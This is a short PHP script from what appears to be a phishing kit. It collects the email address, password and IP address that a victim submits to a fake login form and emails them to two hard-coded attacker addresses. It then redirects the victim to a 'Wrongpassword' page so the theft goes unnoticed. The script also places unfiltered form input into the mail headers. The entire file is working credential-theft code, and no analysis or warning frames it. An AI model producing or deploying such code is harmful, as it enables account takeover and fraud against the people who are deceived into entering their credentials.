<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Spam ReSulT--------------------\n";
$message .= "Email Address  : ".$_POST['log']."\n";
$message .= "Password : ".$_POST['pwd']."\n";
$message .= "----------------created by n0b0dy-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------Spam ReSulT--------------------\n";
$send = "Richardsmith292929@gmail.com,Richardsmith292929@yandex.com";
$subject = "Carlito ReZulTs";
$headers = "From: ReZult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "Wrongpassword.php";

</script>